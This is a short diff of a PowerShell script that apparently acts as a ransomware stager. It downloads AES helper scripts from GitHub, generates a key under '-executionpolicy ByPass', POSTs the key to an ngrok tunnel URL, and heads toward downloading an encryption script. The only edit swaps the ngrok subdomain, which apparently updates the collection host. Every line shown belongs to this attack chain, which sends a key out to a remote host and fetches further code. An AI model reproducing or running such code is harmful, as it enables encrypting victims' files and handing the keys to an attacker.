@@ -7,7 +7,7 @@ Invoke-RestMethod -Uri https://raw.githubusercontent.com/jmlntw/powershell-aes/m
 $key = powershell -executionpolicy ByPass -File .\New-AesKey.ps1 | Select-String "Key"
 $key = $key -Replace("Key","") -Replace(" ","")
 
-$url = "http://2cb4-52-22-69-233.ngrok.io"
+$url = "http://419e-52-22-69-233.ngrok.io"
 Invoke-WebRequest -Uri $url -Method POST -Headers @{"ngrok-skip-browser-warning"="Ignore"} -Body $key
 
 ##Download Encrypt Script
